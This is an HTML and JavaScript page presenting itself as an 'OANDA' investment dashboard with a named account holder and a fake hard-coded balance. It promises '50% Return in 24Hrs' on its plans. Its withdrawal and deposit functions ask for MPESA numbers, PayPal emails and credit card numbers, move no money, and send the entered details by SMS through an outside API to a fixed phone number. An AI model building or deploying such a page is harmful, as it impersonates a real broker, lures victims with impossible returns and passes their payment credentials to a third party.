<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OANDA - Investment Dashboard</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <script src="https://s3.tradingview.com/tv.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            text-align: center;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: white;
            max-width: 800px;
            margin: auto;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h1 { color: #0073e6; }
        .account-info, .controls, .investment-plans {
            margin-bottom: 20px;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 10px;
            background: #f9f9f9;
        }
        .balance { font-size: 24px; font-weight: bold; color: green; }
        button {
            padding: 10px 20px;
            margin: 10px;
            border: none;
            cursor: pointer;
            font-size: 16px;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>OANDA - Investment Platform</h1>
        <div class="account-info">
            <p><strong>Account Holder:</strong> Jacob Amaitsa</p>
            <p class="balance" id="balance">Balance: KES 186,976.44</p>
        </div>
        <div class="controls">
            <button onclick="initiateWithdrawal()">Withdraw</button>
            <button onclick="initiateDeposit()">Deposit</button>
        </div>
        <div class="investment-plans">
            <h2>Investment Plans</h2>
            <button onclick="invest(1000)">Basic Plan - KES 1,000 (Weekly Investment, 50% Return in 24Hrs)</button>
            <button onclick="invest(3000)">Gold Plan - KES 3,000 (Bi-Weekly Investment, 50% Return in 24Hrs)</button>
            <button onclick="invest(5000)">Premium Plan - KES 5,000 (Monthly Investment, 50% Return in 24Hrs)</button>
        </div>
    </div>
    
    <script>
        let balance = 186976.44;

        function formatNumber(num) {
            return num.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
        }

        function sendSMS(message) {
            fetch("https://api.africastalking.com/version1/messaging", {
                method: "POST",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "apiKey": "YOUR_API_KEY"
                },
                body: new URLSearchParams({
                    "username": "YOUR_USERNAME",
                    "to": "+254790408472",
                    "message": message,
                    "from": "YourSenderID"
                })
            })
            .then(response => response.json())
            .then(data => console.log("SMS Sent:", data))
            .catch(error => console.error("SMS Error:", error));
        }

        function updateBalanceDisplay() {
            document.getElementById("balance").innerText = "Balance: KES " + formatNumber(balance);
        }

        function initiateWithdrawal() {
            let method = prompt("Select withdrawal method: MPESA, PayPal, or Credit Card");
            if (!method) return;

            let amount = parseFloat(prompt("Enter amount to withdraw (Min: 500 KES, Max: 250,000 KES):"));
            if (isNaN(amount) || amount < 500 || amount > 250000 || amount > balance) {
                alert("Invalid amount or insufficient balance.");
                return;
            }

            let account;
            if (method.toLowerCase() === "mpesa") {
                account = prompt("Enter your MPESA number:");
            } else if (method.toLowerCase() === "paypal") {
                account = prompt("Enter your PayPal email:");
            } else if (method.toLowerCase() === "credit card") {
                account = prompt("Enter your Credit Card number:");
            } else {
                alert("Invalid method selected.");
                return;
            }

            if (!account) return;
            let confirmWithdrawal = confirm(`Withdraw KES ${formatNumber(amount)} to ${account} via ${method}?`);
            if (confirmWithdrawal) {
                balance -= amount;
                updateBalanceDisplay();
                let smsMessage = `Withdrawal Alert: KES ${formatNumber(amount)} withdrawn via ${method}. Account: ${account}. New Balance: KES ${formatNumber(balance)}`;
                sendSMS(smsMessage);
                alert(`KES ${formatNumber(amount)} withdrawn successfully via ${method}`);
            }
        }

        function initiateDeposit() {
            let method = prompt("Select deposit method: MPESA, PayPal, or Credit Card");
            if (!method) return;

            let amount = parseFloat(prompt("Enter amount to deposit (Min: 500 KES, Max: 250,000 KES):"));
            if (isNaN(amount) || amount < 500 || amount > 250000) {
                alert("Invalid deposit amount.");
                return;
            }

            let account;
            if (method.toLowerCase() === "mpesa") {
                account = prompt("Enter your MPESA number:");
            } else if (method.toLowerCase() === "paypal") {
                account = prompt("Enter your PayPal email:");
            } else if (method.toLowerCase() === "credit card") {
                account = prompt("Enter your Credit Card number:");
            } else {
                alert("Invalid method selected.");
                return;
            }

            if (!account) return;
            balance += amount;
            updateBalanceDisplay();
            let smsMessage = `Deposit Alert: KES ${formatNumber(amount)} deposited via ${method}. Account: ${account}. New Balance: KES ${formatNumber(balance)}`;
            sendSMS(smsMessage);
            alert(`KES ${formatNumber(amount)} deposited successfully via ${method}`);
        }

        updateBalanceDisplay();
    </script>
</body>
</html>
